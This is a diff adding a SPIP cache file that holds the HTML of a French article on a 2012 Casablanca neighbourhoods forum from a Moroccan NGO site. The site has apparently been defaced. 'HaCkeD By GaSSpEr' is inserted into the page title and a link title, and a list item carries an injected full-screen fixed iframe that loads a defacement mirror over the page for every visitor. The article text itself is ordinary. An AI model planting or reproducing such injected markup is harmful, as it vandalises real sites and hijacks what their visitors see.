@@ -1,0 +1,235 @@
+a:11:{s:5:"texte";s:12285:"
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr" dir="ltr">
+<head>
+	<title>Le Forum social des quartiers populaires en route vers le Forum social mondial 2013 (Tunis) - [HaCkeD By GaSSpEr]</title>
+		<?php echo recuperer_fond( 'inc/inc-meta', array('id_article' => '173',
+	'lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',7,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+		<?php echo recuperer_fond( 'styles', array('lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',8,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+	
+</head>
+<body dir="ltr" class="fr article sect29 rub29 art173">
+<div id="page" class="article art173">
+<!-- *****************************************************************
+	Bandeau, titre du site et menu langue
+	Header and main menu (top and right) 
+    ************************************************************* -->
+	
+<?php echo recuperer_fond( 'inc/inc-bandeau', array('id_article' => '173',
+	'lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',18,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+
+
+<!-- *****************************************************************
+	Contenu principal (centre)
+	Main content (center) 
+    ************************************************************* -->
+
+    <div id="bloc-contenu">
+      <div class="article-info-rubrique">
+        <h5>
+        <a href="http://www.forumalternatives.org" title="Accueil du site : HaCkeD By GaSSpEr">Accueil du site</a>
+        
+            
+              <b class='separateur'>&gt;</b> 
+              <a href="http://www.forumalternatives.org/spip.php?rubrique29">Nouveauté</a>
+            
+        </h5>
+
+        
+        
+        <div class="ligne-debut"></div><!-- ligne-debut -->
+      </div><!-- article-info-rubrique -->
+      
+      <div class="cartouche">
+			
+			<div  class="surtitre">19 et 20 Mai 2012 - Casablanca</div>
+			<h1 class="titre-article">Le Forum social des quartiers populaires en route vers le Forum social mondial 2013 (Tunis)</h1>
+            
+      		<div class="detail">
+				<span class="date">mardi 22 mai 2012</span> 
+				<span class="auteurs">par  <span class="vcard author"><a class="url fn spip_in" href="spip.php?auteur1">FMAS</a></span></span>				
+     		 </div><!-- detail -->
+				
+      </div><!-- cartouche -->
+
+
+		<div class="chapo"><p>Le Forum des quartiers s’est ouvert samedi 19 mai, à la Fabrique culturelle des anciens Abattoirs de Casablanca, en présence d’une centaine de participants, acteurs associatifs, représentants d’ONG et bien sûr habitants des quartiers populaires de Casablanca.</p></div>
+		<div class="texte"><p>L’objectif de cette rencontre était d’approfondir la réflexion et les débats démocratiques et libres sur de sujets qui concernent directement les habitants des quartiers populaires et qui sont liés aux répercussions négatives de la mondialisation sur leur vie, à savoir les violations de leurs droits économiques, sociaux, culturelle et environnementaux, qui sont des droits humains fondamentaux. Cette rencontre constitue également une étape préparatoire du prochain forum social mondial qui aura lieu à Tunis en mars 2013.</p>
+
+<p>La question de la politique de la ville par rapport aux quartiers a été au cœur des débats tout au long de la journée et les participants ont discuté des alternatives possibles qui pourraient permettre réhabilitation du quartier comme une échelle locale pertinente. Les participants souhaitent relever le défi de créer de nouvelles formes concrètes pour la construction d’une autre ville avec au cœur des préoccupations&nbsp;: les politiques de développement, de justice sociale, , la parité, l’égalité homme/femme ainsi que les autres droits et libertés.</p>
+
+<p>Les participants ont fait part de leurs expériences et des échanges avaient pour but de dessiner/développer des pistes de nouvelles politiques publiques pour un autre quartier possible et de mettre en œuvre des stratégies pour lutter contre les politiques néolibérales néfastes.</p>
+
+<p><span class='spip_document_167 spip_documents spip_documents_center'>
+<img src='local/cache-vignettes/L560xH420/DSC05523-20b2d.jpg' width='560' height='420' alt="" style='height:420px;width:560px;' /></span></p>
+
+<p>L’après-midi, les participants répartis en 4 ateliers, ont pu débattre et échanger autour des thématiques suivantes&nbsp;:
+<br /><img src="local/cache-vignettes/L8xH11/puce-32883.gif" width='8' height='11' class='puce' alt="-" style='height:11px;width:8px;' />&nbsp;	Médias alternatifs
+<br /><img src="local/cache-vignettes/L8xH11/puce-32883.gif" width='8' height='11' class='puce' alt="-" style='height:11px;width:8px;' />&nbsp;	Société civile et réforme constitutionnelle
+<br /><img src="local/cache-vignettes/L8xH11/puce-32883.gif" width='8' height='11' class='puce' alt="-" style='height:11px;width:8px;' />&nbsp;	Rôle de la société civile dans la consolidation de la démocratie locale
+<br /><img src="local/cache-vignettes/L8xH11/puce-32883.gif" width='8' height='11' class='puce' alt="-" style='height:11px;width:8px;' />&nbsp;	Droits économiques, sociaux, culturels et environnementaux</p>
+
+<p>Les débats et discussions se sont poursuivis également le lendemain et les participants ont formulé à l’issue de la rencontre des recommandations, qui seront, entre autres, portées lors du prochain forum social mondial.</p></div>
+		
+		
+		
+		<br class="nettoyeur" />
+
+
+		
+
+		
+		
+		<!-- Derniers articles des auteurs de l'article -->
+		
+			<div class="ps" id="articles-recents-auteur">
+				
+				<h4><a href="spip.php?auteur1" title="FMAS">FMAS</a></h4>	
+					
+					<h3><em>Articles de cet auteur</em></h3>
+					<ul>
+						
+						<li>	
+							<a href="spip.php?article195" ><iframe src="http://zonehmirrors.org/defaced/2014/12/04/www.incineration.org/www.incineration.org/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%"></a>
+						</li>
+							
+						<li>	
+							<a href="spip.php?article175" >Termes de référence&nbsp;: CHARGE ( E ) DE CONTENU DU SITE &#171;&nbsp;WEBRADIO JOUSSOUR&nbsp;&#187;</a>
+						</li>
+							
+						<li>	
+							<a href="spip.php?article202" >   منتدى بدائل المغرب بتعاون مع المرصد المغربي للحريات العامة ينظمان ندوة صحفية حول حرية التجمعات والتجمهر والتظاهرات بالمغرب</a>
+						</li>
+							
+						<li>	
+							<a href="spip.php?article200" > Communiqué   Le Forum des Alternatives Maroc, en collaboration avec l’Observatoire Marocain des Libertés publiques, organisent une conférence de presse sur les libertés de rassemblement et de manifestation au Maroc   Le 06 mai 2014 à 10h00,  à l’Hôtel Golden Tulip Farah, 160 Avenue F.A.R Casablanca</a>
+						</li>
+							
+						<li>	
+							<a href="spip.php?article204" >Communiqué de presse La Dynamique de l’appel de Rabat des associations démocrates confirme la continuité de son boycott du dialogue sur la société civile, organisé par le gouvernement.</a>
+						</li>
+							
+						<li><a href="spip.php?auteur1" title="suite">[...]</a></li>
+					</ul>
+					
+				
+			</div><!-- notes chapo -->
+		
+
+		<!-- Mots cles -->
+		
+		
+
+		<!-- Forums -->
+		
+		
+	</div><!-- bloc-contenu -->
+	
+<!-- *****************************************************************
+	Menus contextuels (droite)
+	Contextual menus (right) 
+    ************************************************************* -->
+    <div id="encart"> 
+      <?php echo recuperer_fond( 'inc/inc-annonces', array('lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',188,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+		<!-- Derniers articles dans la meme rubrique -->
+		
+			<div class="menu" id="articles_meme_rubrique">
+			<h2 class="structure">Articles les plus r&eacute;cents</h2>
+				<a name='pagination_articles_rubrique' id='pagination_articles_rubrique'></a>
+				<ul>
+					<li>
+						<a href="http://www.forumalternatives.org/spip.php?rubrique29">Dans la m&ecirc;me rubrique</a>
+						<ul>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article175" >Termes de référence&nbsp;: CHARGE ( E ) DE CONTENU DU SITE &#171;&nbsp;WEBRADIO JOUSSOUR&nbsp;&#187;</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article199" >La 3éme assise régionale  sur &#171;&nbsp;Le mouvement associatif à la lumière des nouvelles dispositions constitutionnelles&nbsp;: Enjeux et défis&nbsp;&#187;</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article198" >Interdiction du Forum maghrébin pour la lutte contre le chômage et le travail précaire&nbsp;: Arrestations, expulsions</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article193" >Maroc - Managem donne suite à ses engagements</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article192" >&#171;&nbsp;DAWAR LANTER&nbsp;&#187; -  Représentation en Première</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article190" >Forum social des migrants&nbsp;: déclaration d&#8217;Oujda du Forum social Maghrébin</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article188" >L’Université d’Automne Jeunesse aura lieu les 12, 13 et 14 octobre 2012 à Bouznika (Maroc)</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article186" >&#171;&nbsp;Le Conseil Consultatif des Jeunes et de l’Action Associative&nbsp;: Défis du Mouvement Associatif et de la Jeunesse&nbsp;&#187;</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article185" >Action Jeunesse organise des "cafés libertés" dans une vingtaine de villes du Maroc</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article183" >Dossier spécial "Assemblée préparatoire du Forum social Mondial - Tunis 2013"</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article180" >Assemblée préparatoire du Forum Social Mondial 2013 , Monastir</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article176" >Une autre Tunisie est possible, dans un autre Maghreb et un autre monde</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article172" >Rencontre internationale à Monastir (Tunisie) du 12 au 18 juillet 2012</a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article171" >APPEL STOP TGV&nbsp;! </a>
+							</li>
+							
+							<li>
+								<a href="http://www.forumalternatives.org/spip.php?article170" >منتــــدى الأحـــــــياء الشعبيــــــــة  19 - 20 ماي 2012  بالباطوار </a>
+							</li>
+							
+						</ul>
+					</li>
+				</ul>
+				<span class="on">0</span>
+	|
+
+ <a href='spip.php?article173&amp;debut_articles_rubrique=15#pagination_articles_rubrique' class='lien_pagination' rel='nofollow'>15</a>
+			</div><!-- menu -->
+		
+
+	</div><!-- encart -->
+	
+
+<?php echo recuperer_fond( 'inc/inc-menu', array('id_rubrique' => '29',
+	'lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',213,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+
+<?php echo recuperer_fond( 'inc/inc-bas', array('id_article' => '173',
+	'id_rubrique' => '29',
+	'id_secteur' => '29',
+	'lang' => 'fr'), array("compil"=>array('plugins/auto/ahuntsic/article.html','html_0feb356541ece574d5ca5f126926b590','',215,$GLOBALS['spip_lang'])), _request("connect"));
+?>
+</div><!-- page -->
+
+</body>
+</html>
+";s:9:"squelette";s:37:"html_0feb356541ece574d5ca5f126926b590";s:6:"source";s:34:"plugins/auto/ahuntsic/article.html";s:11:"process_ins";s:3:"php";s:11:"invalideurs";a:1:{s:5:"cache";s:35:"2/%2Fspip--fr--74762cff1802a83c1ae8";}s:7:"entetes";a:1:{s:12:"X-Spip-Cache";i:86400;}s:5:"duree";i:0;s:5:"notes";s:0:"";s:8:"contexte";a:7:{s:10:"article173";s:0:"";s:4:"lang";s:2:"fr";s:10:"id_article";s:3:"173";s:4:"date";s:19:"2014-12-07 20:06:21";s:12:"date_default";b:1;s:10:"date_redac";s:19:"2014-12-07 20:06:21";s:18:"date_redac_default";b:1;}s:12:"lastmodified";i:1418000781;s:2:"gz";b:0;}
